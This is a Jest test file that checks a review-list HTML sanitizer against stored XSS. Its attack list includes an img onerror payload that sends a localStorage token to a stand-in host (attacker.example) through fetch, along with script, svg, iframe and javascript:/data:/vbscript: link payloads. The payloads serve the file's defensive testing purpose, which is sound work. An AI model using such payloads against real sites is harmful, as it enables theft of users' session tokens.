/** @jest-environment jsdom */
import { render, cleanup } from '@testing-library/react';
import { sanitizeHtml } from '../client/src/lib/sanitize';
import ReviewList from '../client/src/components/ReviewList';

afterEach(cleanup);

const attacks = [
  `<img src=x onerror="alert('XSS — your token: ' + localStorage.getItem('token'))">`,
  `<img src=x onerror="fetch('https://attacker.example/steal?t=' + localStorage.getItem('token'))">`,
  '<svg onload="alert(1)"></svg>',
  '<script>alert(1)</script>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<p onclick="alert(1)" style="color:red" data-x="1">Review</p>',
];

test.each(attacks)('removes executable markup: %s', body => {
  const { container } = render(<ReviewList reviews={[
    { _id: 'stored-review', rating: 5, body, author: { name: 'Student' } },
  ]} />);
  const review = container.querySelector('.review-body');
  expect(review.querySelector('img, svg, script, iframe, object')).toBeNull();
  for (const element of review.querySelectorAll('*')) {
    expect([...element.attributes].every(a => ['href', 'title'].includes(a.name))).toBe(true);
  }
});

test.each(['javascript:alert(1)', 'jav&#x61;script:alert(1)', 'java&#10;script:alert(1)',
  'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)'])('rejects unsafe link %s', href => {
  const host = document.createElement('div');
  host.innerHTML = sanitizeHtml(`<a href="${href}">link</a>`);
  expect(host.querySelector('a').hasAttribute('href')).toBe(false);
});

test('preserves approved formatting and safe links', () => {
  const body = '<p><b>Bold</b><strong>Strong</strong><i>Italic</i><em>Emphasis</em><br></p>' +
    '<ul><li>One</li></ul><ol><li>Two</li></ol>' +
    '<a href="https://example.com/book" title="Book">Book</a><a href="/listings">Listings</a>';
  expect(sanitizeHtml(body)).toBe(body);
});

test('cleans existing records again when the list is reloaded', () => {
  const reviews = [{ _id: 'old', body: attacks[0] + '<b>Useful</b>', rating: 4 }];
  const { container, rerender } = render(<ReviewList reviews={reviews} />);
  expect(container.querySelector('.review-body').innerHTML).toBe('<b>Useful</b>');
  rerender(<ReviewList reviews={[...reviews]} />);
  expect(container.querySelector('.review-body').innerHTML).toBe('<b>Useful</b>');
});
